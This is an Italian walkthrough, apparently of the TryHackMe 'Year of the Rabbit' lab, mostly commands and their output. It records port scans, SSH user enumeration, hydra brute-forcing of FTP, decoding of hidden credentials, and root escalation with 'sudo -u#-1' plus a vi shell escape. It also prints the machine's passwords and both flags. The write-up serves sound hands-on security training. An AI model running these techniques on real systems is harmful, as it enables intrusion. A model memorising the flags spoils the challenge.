@@ -1,0 +1,467 @@
+	Controllo se la macchina è online
+PING 10.10.201.84 (10.10.201.84) 56(84) bytes of data.
+64 bytes from 10.10.201.84: icmp_seq=1 ttl=63 time=48.6 ms
+
+--- 10.10.201.84 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 48.550/48.550/48.550/0.000 ms
+
+	Scansiono le porte Tcp 
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-14 04:19 EDT
+Nmap scan report for 10.10.201.84
+Host is up (0.051s latency).
+Not shown: 60 closed tcp ports (reset)
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+
+Scansiono il servizio FTP e provo a connettermi con account anonymous ma non ottengo risultato
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.2
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 5.4 (94%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (93%), Sony Android TV (Android 5.0) (93%), Android 5.0 - 6.0.1 (Linux 3.4) (93%), Android 5.1 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Uptime guess: 198.840 days (since Tue Dec 27 07:12:11 2022)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=263 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Unix
+
+Scansiono SSH e provo un bruteforce ma non ottengo risultati utili, vedo delle possibili vulnerabilita 
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
+| ssh-dss AAAAB3NzaC1kc3MAAACBAILCKdtvyy1FqH1gBS+POXpHMlDynp+m6Ewj2yoK2PJKJeQeO2yRty1/qcf0eAHJGRngc9+bRPYe4M518+7yBVdO2p8UbIItiGzQHEXJu0tGdhIxmpbTdCT6V8HqIDjzrq2OB/PmsjoApVHv9N5q1Mb2i9J9wcnzlorK03gJ9vpxAAAAFQDVV1vsKCWHW/gHLSdO40jzZKVoyQAAAIA9EgFqJeRxwuCjzhyeASUEe+Wz9PwQ4lJI6g1z/1XNnCKQ9O6SkL54oTkB30RbFXBT54s3a11e5ahKxtDp6u9yHfItFOYhBt424m14ks/MXkDYOR7y07FbBYP5WJWk0UiKdskRej9P79bUGrXIcHQj3c3HnwDfKDnflN56Fk9rIwAAAIBlt2RBJWg3ZUqbRSsdaW61ArR4YU7FVLDgU0pHAIF6eq2R6CCRDjtbHE4X5eW+jhi6XMLbRjik9XOK78r2qyQwvHADW1hSWF6FgfF2PF5JKnvPG3qF2aZ2iOj9BVmsS5MnwdSNBytRydx9QJiyaI4+HyOkwomj0SINqR9CxYLfRA==
+|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZyTWF65dczfLiKN0cNpHhm/nZ7FWafVaCf+Oxu7+9VM4GBO/8eWI5CedcIDkhU3Li/XBDUSELLXSRJOtQj5WdBOrFVBWWA3b3ICQqk0N1cmldVJRLoP1shBm/U5Xgs5QFx/0nvtXSGFwBGpfVKsiI/YBGrDkgJNAYdgWOzcQqol/nnam8EpPx0nZ6+c2ckqRCizDuqHXkNN/HVjpH0GhiscE6S6ULvq2bbf7ULjvWbrSAMEo6ENsy3RMEcQX+Ixxr0TQjKdjW+QdLay0sR7oIiATh5AL5vBGHTk2uR8ypsz1y7cTyXG2BjIVpNWeTzcip7a2/HYNNSJ1Y5QmAXoKd
+|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHKavguvzBa889jvV30DH4fhXzMcLv6VdHFx3FVcAE0MqHRcLIyZcLcg6Rf0TNOhMQuu7Cut4Bf6SQseNVNJKK8=
+|   256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFBJPbfvzsYSbGxT7dwo158eVWRlfvXCxeOB4ypi9Hgh
+|_ssh-run: Failed to specify credentials and command to run.
+| vulners: 
+|   cpe:/a:openbsd:openssh:6.7p1: 
+|       CVE-2015-5600   8.5     https://vulners.com/cve/CVE-2015-5600
+|       CVE-2015-6564   6.9     https://vulners.com/cve/CVE-2015-6564
+|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919
+|       SSV:90447       4.6     https://vulners.com/seebug/SSV:90447    *EXPLOIT*
+|       CVE-2016-0778   4.6     https://vulners.com/cve/CVE-2016-0778
+|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617
+|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
+|       CVE-2015-5352   4.3     https://vulners.com/cve/CVE-2015-5352
+|       CVE-2016-0777   4.0     https://vulners.com/cve/CVE-2016-0777
+|_      CVE-2015-6563   1.9     https://vulners.com/cve/CVE-2015-6563
+| ssh-publickey-acceptance: 
+|_  Accepted Public Keys: No public keys accepted
+| ssh-auth-methods: 
+|   Supported authentication methods: 
+|     publickey
+|_    password
+
+enumero i possibili utenti e trovo i seguenti
+USER_FILE => /usr/share/brutex/wordlists/simple-users.txt
+RHOSTS => 10.10.201.84
+RHOST => 10.10.201.84
+[*] 10.10.201.84:22 - SSH - Using malformed packet technique
+[*] 10.10.201.84:22 - SSH - Checking for false positives
+[*] 10.10.201.84:22 - SSH - Starting scan
+[+] 10.10.201.84:22 - SSH - User 'backup' found
+[+] 10.10.201.84:22 - SSH - User 'ftp' found
+[+] 10.10.201.84:22 - SSH - User 'mail' found
+[+] 10.10.201.84:22 - SSH - User 'nobody' found
+[+] 10.10.201.84:22 - SSH - User 'root' found
+[+] 10.10.201.84:22 - SSH - User 'sys' found
+[+] 10.10.201.84:22 - SSH - User 'www-data' found
+
+Scansiono il servizio http e ottengo il seguente risultato
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.10 ((Debian))
+|_http-server-header: Apache/2.4.10 (Debian)
+| vulners: 
+|   cpe:/a:apache:http_server:2.4.10: 
+|       PACKETSTORM:171631      7.5     https://vulners.com/packetstorm/PACKETSTORM:171631    *EXPLOIT*
+|       EDB-ID:51193    7.5     https://vulners.com/exploitdb/EDB-ID:51193      *EXPLOIT*
+|       CVE-2023-25690  7.5     https://vulners.com/cve/CVE-2023-25690
+|       CVE-2022-31813  7.5     https://vulners.com/cve/CVE-2022-31813
+|       CVE-2022-23943  7.5     https://vulners.com/cve/CVE-2022-23943
+|       CVE-2022-22720  7.5     https://vulners.com/cve/CVE-2022-22720
+|       CVE-2021-44790  7.5     https://vulners.com/cve/CVE-2021-44790
+|       CVE-2021-39275  7.5     https://vulners.com/cve/CVE-2021-39275
+|       CVE-2021-26691  7.5     https://vulners.com/cve/CVE-2021-26691
+|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
+|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169
+|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167
+|       CNVD-2022-73123 7.5     https://vulners.com/cnvd/CNVD-2022-73123
+|       CNVD-2022-03225 7.5     https://vulners.com/cnvd/CNVD-2022-03225
+|       CNVD-2021-102386        7.5     https://vulners.com/cnvd/CNVD-2021-102386
+|       5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9    7.5     https://vulners.com/githubexploit/5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9 *EXPLOIT*
+|       1337DAY-ID-38427        7.5     https://vulners.com/zdt/1337DAY-ID-38427        *EXPLOIT*
+|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    6.8     https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8 *EXPLOIT*
+|       CVE-2021-40438  6.8     https://vulners.com/cve/CVE-2021-40438
+|       CVE-2020-35452  6.8     https://vulners.com/cve/CVE-2020-35452
+|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
+|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
+|       CVE-2016-5387   6.8     https://vulners.com/cve/CVE-2016-5387
+|       CVE-2014-0226   6.8     https://vulners.com/cve/CVE-2014-0226
+|       CNVD-2022-03224 6.8     https://vulners.com/cnvd/CNVD-2022-03224
+|       8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2    6.8     https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2 *EXPLOIT*
+|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    6.8     https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332 *EXPLOIT*
+|       4373C92A-2755-5538-9C91-0469C995AA9B    6.8     https://vulners.com/githubexploit/4373C92A-2755-5538-9C91-0469C995AA9B *EXPLOIT*
+|       0095E929-7573-5E4A-A7FA-F6598A35E8DE    6.8     https://vulners.com/githubexploit/0095E929-7573-5E4A-A7FA-F6598A35E8DE *EXPLOIT*
+|       CVE-2022-28615  6.4     https://vulners.com/cve/CVE-2022-28615
+|       CVE-2021-44224  6.4     https://vulners.com/cve/CVE-2021-44224
+|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788
+|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
+|       CVE-2022-22721  5.8     https://vulners.com/cve/CVE-2022-22721
+|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
+|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
+|       1337DAY-ID-33577        5.8     https://vulners.com/zdt/1337DAY-ID-33577        *EXPLOIT*
+|       CVE-2022-36760  5.1     https://vulners.com/cve/CVE-2022-36760
+|       SSV:96537       5.0     https://vulners.com/seebug/SSV:96537    *EXPLOIT*
+|       SSV:62058       5.0     https://vulners.com/seebug/SSV:62058    *EXPLOIT*
+|       EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7    5.0     https://vulners.com/exploitpack/EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7   *EXPLOIT*
+|       EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    5.0     https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D   *EXPLOIT*
+|       EDB-ID:42745    5.0     https://vulners.com/exploitdb/EDB-ID:42745      *EXPLOIT*
+|       EDB-ID:40961    5.0     https://vulners.com/exploitdb/EDB-ID:40961      *EXPLOIT*
+|       CVE-2022-37436  5.0     https://vulners.com/cve/CVE-2022-37436
+|       CVE-2022-30556  5.0     https://vulners.com/cve/CVE-2022-30556
+|       CVE-2022-29404  5.0     https://vulners.com/cve/CVE-2022-29404
+|       CVE-2022-28614  5.0     https://vulners.com/cve/CVE-2022-28614
+|       CVE-2022-26377  5.0     https://vulners.com/cve/CVE-2022-26377
+|       CVE-2022-22719  5.0     https://vulners.com/cve/CVE-2022-22719
+|       CVE-2021-34798  5.0     https://vulners.com/cve/CVE-2021-34798
+|       CVE-2021-26690  5.0     https://vulners.com/cve/CVE-2021-26690
+|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
+|       CVE-2019-17567  5.0     https://vulners.com/cve/CVE-2019-17567
+|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
+|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
+|       CVE-2018-1303   5.0     https://vulners.com/cve/CVE-2018-1303
+|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798
+|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
+|       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743
+|       CVE-2016-2161   5.0     https://vulners.com/cve/CVE-2016-2161
+|       CVE-2016-0736   5.0     https://vulners.com/cve/CVE-2016-0736
+|       CVE-2015-3183   5.0     https://vulners.com/cve/CVE-2015-3183
+|       CVE-2015-0228   5.0     https://vulners.com/cve/CVE-2015-0228
+|       CVE-2014-3583   5.0     https://vulners.com/cve/CVE-2014-3583
+|       CVE-2014-3581   5.0     https://vulners.com/cve/CVE-2014-3581
+|       CVE-2013-5704   5.0     https://vulners.com/cve/CVE-2013-5704
+|       CVE-2006-20001  5.0     https://vulners.com/cve/CVE-2006-20001
+|       CNVD-2022-73122 5.0     https://vulners.com/cnvd/CNVD-2022-73122
+|       CNVD-2022-53584 5.0     https://vulners.com/cnvd/CNVD-2022-53584
+|       CNVD-2022-53582 5.0     https://vulners.com/cnvd/CNVD-2022-53582
+|       CNVD-2022-03223 5.0     https://vulners.com/cnvd/CNVD-2022-03223
+|       1337DAY-ID-28573        5.0     https://vulners.com/zdt/1337DAY-ID-28573        *EXPLOIT*
+|       1337DAY-ID-26574        5.0     https://vulners.com/zdt/1337DAY-ID-26574        *EXPLOIT*
+|       CVE-2020-11985  4.3     https://vulners.com/cve/CVE-2020-11985
+|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
+|       CVE-2018-1302   4.3     https://vulners.com/cve/CVE-2018-1302
+|       CVE-2018-1301   4.3     https://vulners.com/cve/CVE-2018-1301
+|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975
+|       CVE-2015-3185   4.3     https://vulners.com/cve/CVE-2015-3185
+|       CVE-2014-8109   4.3     https://vulners.com/cve/CVE-2014-8109
+|       CVE-2014-0118   4.3     https://vulners.com/cve/CVE-2014-0118
+|       4013EC74-B3C1-5D95-938A-54197A58586D    4.3     https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D *EXPLOIT*
+|       1337DAY-ID-33575        4.3     https://vulners.com/zdt/1337DAY-ID-33575        *EXPLOIT*
+|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
+|       CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612
+|_      PACKETSTORM:140265      0.0     https://vulners.com/packetstorm/PACKETSTORM:140265    *EXPLOIT*
+| http-brute:   
+|_  Path "/" does not require authentication
+
+sembrerebbe esserci un web server apache in esecuzione sulla porta 80
+HTTP/1.1 200 OK
+Date: Fri, 14 Jul 2023 08:24:28 GMT
+Server: Apache/2.4.10 (Debian)
+Last-Modified: Thu, 23 Jan 2020 00:34:26 GMT
+ETag: "1ead-59cc3cda1f3a4"
+Accept-Ranges: bytes
+Content-Length: 7853
+Vary: Accept-Encoding
+Content-Type: text/html
+
+HTTP/1.1 200 OK
+Date: Fri, 14 Jul 2023 08:24:28 GMT
+Server: Apache/2.4.10 (Debian)
+Last-Modified: Thu, 23 Jan 2020 00:34:26 GMT
+ETag: "1ead-59cc3cda1f3a4"
+Accept-Ranges: bytes
+Content-Length: 7853
+Vary: Accept-Encoding
+Content-Type: text/html
+
+Allow: POST,OPTIONS,GET,HEAD
+
+Trami dirsearch teovo le seguenti directory sul server apache
+[04:25:50] Starting: 
+[04:25:52] 200 -    8KB - /?a=/bin/sh+-c+                                  
+[04:25:58] 200 -    8KB - /%0ASet-Cookie%3Acrlfinjection/..                
+[04:26:02] 200 -    1KB - /assets/                                          
+[04:26:03] 200 -    1KB - /assets                                           
+[04:26:29] 200 -    8KB - /index.html  
+[04:26:46] 200 -    8KB - /?phpinfo=-1                                      
+[04:26:59] 200 -    8KB - /?pp=env  
+
+Apro la cartella assets e trovo due file: RickRolled.mp4 e style.css
+http://10.10.201.84/assets/style.css oltre a informazioni sul layout grafico contiene le seguenti informazioni:
+  /* Nice to see someone checking the stylesheets.
+     Take a look at the page: /sup3r_s3cr3t_fl4g.php
+  */
+ Se però provo ad aprirla mi rimanda su youtube al video RickRolled.mp4, deduco ci sia qualcosa in backend perciò utilizzo BurpSuite
+ 
+GET /sup3r_s3cr3t_fl4g.php HTTP/1.1
+Host: 10.10.201.84
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+HTTP/1.1 302 Found
+Date: Fri, 14 Jul 2023 08:37:57 GMT
+Server: Apache/2.4.10 (Debian)
+location: /sup3r_s3cret_fl4g
+Content-Length: 0
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+----------------
+
+GET /intermediary.php?hidden_directory=/WExYY2Cv-qU HTTP/1.1
+Host: 10.10.201.84
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+HTTP/1.1 302 Found
+Date: Fri, 14 Jul 2023 08:37:37 GMT
+Server: Apache/2.4.10 (Debian)
+Location: intermediary.php?hidden_directory=/WExYY2Cv-qU
+Content-Length: 0
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+Alla mia seconda richiesta noto una hidden directory /WexYY2Cv-qU provo ad aprila, contiene il gile Hot_Babe.png
+Presumo ci sia qualcosa di nascosto nell'immagine 
+┌──(kali㉿kali)-[~/Desktop]
+└─$ exiftool Hot_Babe.png 
+ExifTool Version Number         : 12.63
+File Name                       : Hot_Babe.png
+Directory                       : .
+File Size                       : 475 kB
+File Modification Date/Time     : 2020:01:22 19:34:32-05:00
+File Access Date/Time           : 2023:07:14 04:42:30-04:00
+File Inode Change Date/Time     : 2023:07:14 04:42:30-04:00
+File Permissions                : -rw-r--r--
+File Type                       : PNG
+File Type Extension             : png
+MIME Type                       : image/png
+Image Width                     : 512
+Image Height                    : 512
+Bit Depth                       : 8
+Color Type                      : RGB
+Compression                     : Deflate/Inflate
+Filter                          : Adaptive
+Interlace                       : Noninterlaced
+SRGB Rendering                  : Perceptual
+Warning                         : [minor] Trailer data after PNG IEND chunk
+Image Size                      : 512x512
+Megapixels                      : 0.262
+
+Nulla di utile, provo con strings
+Oltre a informazioni inutili ottengo la seguente informazione
+
+Eh, you've earned this. Username for FTP is ftpuser
+One of these is the password:
+Mou+56n%QK8sr
+1618B0AUshw1M
+A56IpIl%1s02u
+vTFbDzX9&Nmu?
+FfF~sfu^UQZmT
+8FF?iKO27b~V0
+ua4W~2-@y7dE$
+3j39aMQQ7xFXT
+Wb4--CTc4ww*-
+u6oY9?nHv84D&
+0iBp4W69Gr_Yf
+TS*%miyPsGV54
+C77O3FIy0c0sd
+O14xEhgg0Hxz1
+5dpv#Pr$wqH7F
+1G8Ucoce1+gS5
+0plnI%f0~Jw71
+0kLoLzfhqq8u&
+kS9pn5yiFGj6d
+zeff4#!b5Ib_n
+rNT4E4SHDGBkl
+KKH5zy23+S0@B
+3r6PHtM4NzJjE
+gm0!!EC1A0I2?
+HPHr!j00RaDEi
+7N+J9BYSp4uaY
+PYKt-ebvtmWoC
+3TN%cD_E6zm*s
+eo?@c!ly3&=0Z
+nR8&FXz$ZPelN
+eE4Mu53UkKHx#
+86?004F9!o49d
+SNGY0JjA5@0EE
+trm64++JZ7R6E
+3zJuGL~8KmiK^
+CR-ItthsH%9du
+yP9kft386bB8G
+A-*eE3L@!4W5o
+GoM^$82l&GA5D
+1t$4$g$I+V_BH
+0XxpTd90Vt8OL
+j0CN?Z#8Bp69_
+G#h~9@5E5QA5l
+DRWNM7auXF7@j
+Fw!if_=kk7Oqz
+92d5r$uyw!vaE
+c-AA7a2u!W2*?
+zy8z3kBi#2e36
+J5%2Hn+7I6QLt
+gL$2fmgnq8vI*
+Etb?i?Kj4R=QM
+7CabD7kwY7=ri
+4uaIRX~-cY6K4
+kY1oxscv4EB2d
+k32?3^x1ex7#o
+ep4IPQ_=ku@V8
+tQxFJ909rd1y2
+5L6kpPR5E2Msn
+65NX66Wv~oFP2
+LRAQ@zcBphn!1
+V4bt3*58Z32Xe
+ki^t!+uqB?DyI
+5iez1wGXKfPKQ
+nJ90XzX&AnF5v
+7EiMd5!r%=18c
+wYyx6Eq-T^9#@
+yT2o$2exo~UdW
+ZuI-8!JyI6iRS
+PTKM6RsLWZ1&^
+3O$oC~%XUlRO@
+KW3fjzWpUGHSW
+nTzl5f=9eS&*W
+WS9x0ZF=x1%8z
+Sr4*E4NT5fOhS
+hLR3xQV*gHYuC
+4P3QgF5kflszS
+NIZ2D%d58*v@R
+0rJ7p%6Axm05K
+94rU30Zx45z5c
+Vi^Qf+u%0*q_S
+1Fvdp&bNl3#&l
+zLH%Ot0Bw&c%9
+
+provo con hydra a brutforcare l'accesso
+[21][ftp] host: 10.10.201.84   login: ftpuser   password: 5iez1wGXKfPKQ
+
+Mi connetto al server FTP
+
+ftp> ls
+229 Entering Extended Passive Mode (|||15337|).
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt
+226 Directory send OK.
+
+Mi scarico il file e vado ad aprilo
+┌──(kali㉿kali)-[~/Desktop]
+└─$ cat Eli\'s_Creds.txt 
++++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
+--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
+++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
++++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
+]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
+++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
+--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
++<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
+++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
+<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
+<]>+. <+++[ ->--- <]>-- ---.- ----. <
+
+Analizzo il cifrato, ottego BrainFuck e lo decifro
+User: eli
+Password: DSpDiM1wAEwid
+
+Deduco siano credenziali SSh, le provo 
+┌──(kali㉿kali)-[~/Desktop]
+└─$ ssh eli@10.10.201.84
+eli@10.10.201.84's password: 
+
+
+1 new message
+Message from Root to Gwendoline:
+
+"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"
+
+END MESSAGE
+
+eli@year-of-the-rabbit:~$ 
+
+Controllo sotto home e vedo l'utente gwendoline con il file user.txt al quale però non posso accedere 
+
+dal messaggio di benvenuto intuisco che s3cr3t potebbe essere una cartella
+eli@year-of-the-rabbit:/home/gwendoline$ locate s3cr3t
+/usr/games/s3cr3t
+/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
+/var/www/html/sup3r_s3cr3t_fl4g.php
+
+controllo il messaggio segrete e vedo il seguente contenuto 
+
+eli@year-of-the-rabbit:/usr/games/s3cr3t$ cat ./.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\! 
+Your password is awful, Gwendoline. 
+It should be at least 60 characters long! Not just MniVCQVhQHUNI
+Honestly!
+
+Yours sincerely
+   -Root
+
+Posso dedurre la password di Gwendoline - MniVCQVhQHUNI
+eli@year-of-the-rabbit:~$ su gwendoline
+Password: 
+gwendoline@year-of-the-rabbit:/home/eli$ 
+
+da qua posso andare a prendere il file che prima mi risultava bloccato
+gwendoline@year-of-the-rabbit:/$ ls
+bin   dev  home        lib    live-build  media  opt   root  sbin  sys  usr  vmlinuz
+boot  etc  initrd.img  lib64  lost+found  mnt    proc  run   srv   tmp  var
+gwendoline@year-of-the-rabbit:/$ cd home/
+gwendoline@year-of-the-rabbit:/home$ cd gwendoline/
+gwendoline@year-of-the-rabbit:~$ ls
+user.txt
+gwendoline@year-of-the-rabbit:~$ cat user.txt 
+THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
+
+Ora devo ottenere i privilegi di root, controllo per prima cosa che file posso andare a modificare
+
+gwendoline@year-of-the-rabbit:~$ sudo -l
+Matching Defaults entries for gwendoline on year-of-the-rabbit:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User gwendoline may run the following commands on year-of-the-rabbit:
+    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
+
+vedo che il file user.txt è modificabile con i privilegi di root 
+con il seguente comando lo apro il file come root con vi
+gwendoline@year-of-the-rabbit:/$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
+
+Una volta aperto posso andare a eschiacciare ESC ed eseguire un terminale con :!/bin/sh
+
+mi si apre una schell con i privilegi di root, tramite id controllo che sia effettivamente root
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
+
+
+
